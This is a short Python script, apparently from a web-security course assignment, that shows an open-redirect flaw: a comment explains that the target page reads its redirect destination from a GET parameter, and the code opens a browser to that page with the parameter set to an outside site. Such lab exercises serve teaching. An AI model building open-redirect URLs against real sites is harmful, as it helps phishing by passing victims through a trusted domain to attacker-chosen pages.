import webbrowser

# Exploit: site uses HTTP parameter for redirect, and tries to access
# "http://wsb.com/Assignment2/case10.php?redirect=case10-2.php" after
# the 5 seconds timeout. The redirected URL can be changed by altering
# the GET parameter

def main():
    webbrowser.open("http://www.wsb.com/Assignment2/case10.php?redirect=http://www.google.com", 2)

if __name__ == "__main__":
    main()
